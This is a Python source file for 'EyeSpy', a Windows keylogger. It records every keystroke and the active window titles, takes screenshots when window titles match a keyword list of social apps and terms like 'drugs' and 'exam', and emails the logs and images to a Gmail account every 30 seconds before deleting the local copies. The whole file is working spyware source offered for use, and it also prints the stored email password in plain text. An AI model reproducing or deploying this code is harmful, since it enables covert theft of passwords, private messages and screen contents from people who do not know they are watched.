#!/usr/bin/python

#  EyeSpy 0.1.3.2a 
# # Currently works on Windows only
# -------------------------------
# * Records all keystrokes
# * Takes automated screenshots ()
# * Sends email containing logs and screenshots
#





                
from threading import Timer
from threading import Thread
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import subprocess, socket, base64, time, datetime, os, sys, urllib2, platform
import pythoncom, pyHook, Image, ImageGrab, win32api, win32gui, win32con, smtplib

# Import the config parser
import ConfigParser

# Static variable for the file name
CFGFILE = 'config.properties'

# Create an instance of ConfigParser
Config = ConfigParser.ConfigParser()

# Read the config file
Config.read(CFGFILE)

# re-assign the properties for clarity
configured = Config.get('email' ,'configured')
email_addr = Config.get('email' ,'email_addr')
email_passwd = Config.get('email' ,'email_passwd')

# Has this been configured already

if ( configured == '0' ):
        email_addr = raw_input('enter email: ')
        email_passwd = raw_input('enter password (must be the same as email password): ')
        
        # You should check that the email addr is valid !!!!!!
        
        # We can set configured to 1 now ...
        configured = 1

        # Update the properties ...
        Config.set('email' ,'configured' , configured)
        Config.set('email' ,'email_addr' , email_addr)
        Config.set('email' , 'email_passwd' , email_passwd)
        
        # and write the updated values to config file .
        
        # first open it for writing ....
        cfgfile = open(CFGFILE ,'w')
        
        # Writing it is a one liner ....
        Config.write(cfgfile)
        
        # Always close the filehandle !!!!!! Always !!! 
        cfgfile.close()

else :
        print('Already configured.')


## unit test .
print(configured) 
print(email_addr) 
print(email_passwd)


#         Keylogger settings            #
#         Email Settings		#
LOG_SENDMAIL = True			# set to True to send emails
LOG_MAIL = email_addr # account email address (must exist)
LOG_PASS = email_passwd # email's password (must exist)
LOG_FROM = 'email'	# email will be sent from this address (fake)
LOG_SUBJ = 'logs'                       # email subject
LOG_MSG = 'EyeSpy!'			# email content - the body
# ------------------------------------- #
#         Screenshot Settings     	#
LOG_SCREENSHOT = True			# set to True to take screenshot(s)
LOG_SCREENSNUM = 1			# set amount of screenshot to take.
LOG_INTERVAL = 1				
LOG_SCREEN = []					
LOG_SCREEN.append("alcahol")
LOG_SCREEN.append("alcohol")
LOG_SCREEN.append("bebo")	
LOG_SCREEN.append("cash")
LOG_SCREEN.append("drug")
LOG_SCREEN.append("drugs")
LOG_SCREEN.append("exam")
LOG_SCREEN.append("exams")
LOG_SCREEN.append("explosives")
LOG_SCREEN.append("Facebook")
LOG_SCREEN.append("guns")
LOG_SCREEN.append("Instagram")
LOG_SCREEN.append("Kik")        
LOG_SCREEN.append("messaging")
LOG_SCREEN.append("money")
LOG_SCREEN.append("MySpace")
LOG_SCREEN.append("omegle 18")	
LOG_SCREEN.append("Omegle")     
LOG_SCREEN.append("pot")
LOG_SCREEN.append("Snapchat")
LOG_SCREEN.append("test")
LOG_SCREEN.append("Tinder")
LOG_SCREEN.append("tumblr")     
LOG_SCREEN.append("twitter")
LOG_SCREEN.append("Viber")
LOG_SCREEN.append("weed")
LOG_SCREEN.append("whatsapp")
LOG_SCREEN.append("yokes")
# Only a small portion of the keyword list. 
# Add your own if required



# ------------LOG_SCREEN.append("")------------ #
# System Settings				# [shouldn't be modified]
LOG_FILENAME = 'Eyespy.txt'	                # log file (current directory)
LOG_TOSEND = []					# contains files to send in email attachment
LOG_ACTIVE = ''					# stores active window
LOG_STATE = False				# Start eyespy as false
LOG_TIME = 0					# amount of time to log in seconds, where 0 = infinite and 86400 = 1 day
LOG_TEXT = ""					# this is the raw log var which will be written to file
LOG_TEXTSIZE = 0				# marks the beginning and end of new text blocks that separate logs
LOG_MINTERVAL = 30                              # main loop intervals in seconds, where 86400 = 1 day (default)
LOG_THREAD_kl = 0				# thread count for eyespy
LOG_THREAD_ss = 0				# thread count for automated screenshots
# --------------------------------------------- #
# Debug [Don't change]			        #
# LOG_ITERATE = 3				#
# print os.getcwd()				#
#################################

# this sets the thread ID before execution.
main_thread_id = win32api.GetCurrentThreadId()

def Keylog(k, LOG_TIME, LOG_FILENAME):
        # only supported for Windows at the moment...
        if os.name != 'nt': return "Not supported for this operating system.\n"
        global LOG_TEXT, LOG_FILE, LOG_STATE, LOG_ACTIVE, main_thread_id
        LOG_STATE = True # begin logging!
        main_thread_id = win32api.GetCurrentThreadId()
        # add timestamp when it starts...
        LOG_TEXT += "\n===================================================\n"
        LOG_DATE = datetime.datetime.now()
        LOG_TEXT += ' ' + str(LOG_DATE) + ' >>> Logging started.. |\n'
        LOG_TEXT += "===================================================\n\n"
        # find out which window is currently active!
        w = win32gui
        LOG_ACTIVE = w.GetWindowText (w.GetForegroundWindow())
        LOG_DATE = datetime.datetime.now()
        LOG_TEXT += "[*] Window activated. [" + str(LOG_DATE) + "] \n"
        LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n"
        LOG_TEXT += " " + LOG_ACTIVE + " |\n"
        LOG_TEXT += "=" * len(LOG_ACTIVE) + "===\n\n"
        if LOG_TIME > 0:
                t = Timer(LOG_TIME, stopKeylog) # Quit
                t.start()
        # open file to write
        LOG_FILE = open(LOG_FILENAME, 'w')
        LOG_FILE.write(LOG_TEXT)
        LOG_FILE.close()
        hm = pyHook.HookManager()
        hm.KeyDown = OnKeyboardEvent
        hm.HookKeyboard()
        pythoncom.PumpMessages() # this is where all the magic happens! ;)
        # after finished, we add the timestamps at the end.
        LOG_FILE = open(LOG_FILENAME, 'a')
        LOG_TEXT += "\n\n===================================================\n"
        LOG_DATE = datetime.datetime.now()
        LOG_TEXT += " " + str(LOG_DATE) + ' >>> Logging finished. |\n'
        LOG_TEXT += "===================================================\n"
        LOG_STATE = False
        try: 
                LOG_FILE.write(LOG_TEXT)
                LOG_FILE.close()
        except:
                LOG_FILE.close()
        return True
        
# this function stops EyeSpy...
# thank God for the StackOverflow! :D
def stopKeylog():
    win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);

# this function actually records the strokes...
def OnKeyboardEvent(event):
        global LOG_STATE, LOG_THREAD_ss
        
        
        if LOG_STATE == False: return True
        global LOG_TEXT, LOG_FILE, LOG_FILENAME, LOG_ACTIVE, LOG_INTERVAL, LOG_SCREENSHOT, LOG_SCREENSNUM
        LOG_TEXT = ""
        LOG_FILE = open(LOG_FILENAME, 'a')
        # check for new window activation
        wg = win32gui
        LOG_NEWACTIVE = wg.GetWindowText (wg.GetForegroundWindow())
        if LOG_NEWACTIVE != LOG_ACTIVE:
                
                LOG_DATE = datetime.datetime.now()
                LOG_TEXT += "\n\n[*] Window activated. [" + str(LOG_DATE) + "] \n"
                LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n"
                LOG_TEXT += " " + LOG_NEWACTIVE + " |\n"
                LOG_TEXT += "=" * len(LOG_NEWACTIVE) + "===\n\n"
                LOG_ACTIVE = LOG_NEWACTIVE
                # take screenshots while logging!
                if LOG_SCREENSHOT == True:
                        LOG_IMG = 0
                        while LOG_IMG < len(LOG_SCREEN):
                                if LOG_NEWACTIVE.find(LOG_SCREEN[LOG_IMG]) > 0:
                                        LOG_TEXT += "[*] Taking " + str(LOG_SCREENSNUM) + " screenshot for \"" + LOG_SCREEN[LOG_IMG] + "\" match.\n"
                                        LOG_TEXT += "[*] Timestamp: " + str(datetime.datetime.now()) + "\n\n"
                                        ss = Thread(target=takeScreenshots, args=(LOG_THREAD_ss,LOG_SCREENSNUM,LOG_INTERVAL))
                                        ss.start()
                                        LOG_THREAD_ss += 1 # add 1 to the thread counter
                                LOG_IMG += 1
                LOG_FILE.write(LOG_TEXT)
        
        LOG_TEXT = ""	
        if event.Ascii == 8: LOG_TEXT += "\b"
        elif event.Ascii == 13 or event.Ascii == 9: LOG_TEXT += "\n"
        else: LOG_TEXT += str(chr(event.Ascii))
        # write to file
        LOG_FILE.write(LOG_TEXT) 
        LOG_FILE.close()
        
        return True

# screenshot function
def Screenshot():
        img=ImageGrab.grab()
        saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.png')
        img.save(saveas)
        if LOG_SENDMAIL == True:
                addFile = str(os.getcwd()) + "\\" + str(saveas)
                LOG_TOSEND.append(addFile) # add to the list

# take multiple screenshots function
# args = number of shots, interval between shots
def takeScreenshots(i, maxShots, intShots):
        shot = 0
        while shot < maxShots:
                shottime = time.strftime('%Y_%m_%d_%H_%M_%S')
                Screenshot()
                time.sleep(intShots)
                shot += 1
        

# send email function
# this example is for GMAIL, if you use a different server
# to change the line below to the server/port needed
# server = smtplib.SMTP('smtp.gmail.com:587')
def sendEmail():
        msg = MIMEMultipart()
        msg['Subject'] = LOG_SUBJ
        msg['From'] = LOG_FROM
        msg['To'] = LOG_MAIL
        msg.preamble = LOG_MSG
        # attach each file in LOG_TOSEND list  
        for file in LOG_TOSEND:
                # attach text file
                if file[-4:] == '.txt':
                        fp = open(file)
                        attach = MIMEText(fp.read())
                        fp.close()
                # attach images
                elif file[-4:] == '.png':
                        fp = open(file, 'rb')
                        attach = MIMEImage(fp.read())
                        fp.close()
                attach.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file))
                msg.attach(attach)
                
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()  
        server.login(email_addr,email_passwd)
        server.sendmail(LOG_FROM, LOG_MAIL, msg.as_string())  
        server.quit()

# function to clean up files
def deleteFiles():
        if len(LOG_TOSEND) < 1: return True
        for file in LOG_TOSEND:
                os.unlink(file)
        

# begin keylogging
kl = Thread(target=Keylog, args=(LOG_THREAD_kl,LOG_TIME,LOG_FILENAME))
kl.start()
        
# if keylogging is running infinitely
if LOG_TIME < 1:
        # begin continuous loop
        while True:
                
                time.sleep(LOG_MINTERVAL) # sleep for time specified
                
                LOG_NEWFILE = time.strftime('%Y_%m_%d_%H_%M_%S') + ".txt"
                # add file to the LOG_TOSEND list
                if LOG_SENDMAIL == True:
                        addFile = str(os.getcwd()) + "\\" + str(LOG_NEWFILE)
                        LOG_TOSEND.append(addFile) # add to the list
                
                LOG_SAVEFILE = open(LOG_NEWFILE, 'w')
                LOG_CHCKSIZE = open(LOG_FILENAME, 'r')
                LOG_SAVEFILE.write(LOG_CHCKSIZE.read())
                LOG_CHCKSIZE.close()
                try:
                        LOG_SAVEFILE.write(LOG_SAVETEXT)
                        LOG_SAVEFILE.close()
                except:
                        LOG_SAVEFILE.close()
                
                # send email
                if LOG_SENDMAIL == True:
                        sendEmail()
                        time.sleep(6)
                        deleteFiles()
                LOG_TOSEND = [] # clear this list
                
                
# otherwise sleep for specified time, then break program
elif LOG_TIME > 0:
        # sleep for time specified
        time.sleep(LOG_TIME)
        time.sleep(2)
        # check to send email
        if LOG_SENDMAIL == True:
                addFile = str(os.getcwd()) + "\\" + str(LOG_FILENAME)
                LOG_TOSEND.append(addFile) # add to the list
                sendEmail()
        time.sleep(2)

sys.exit()
        
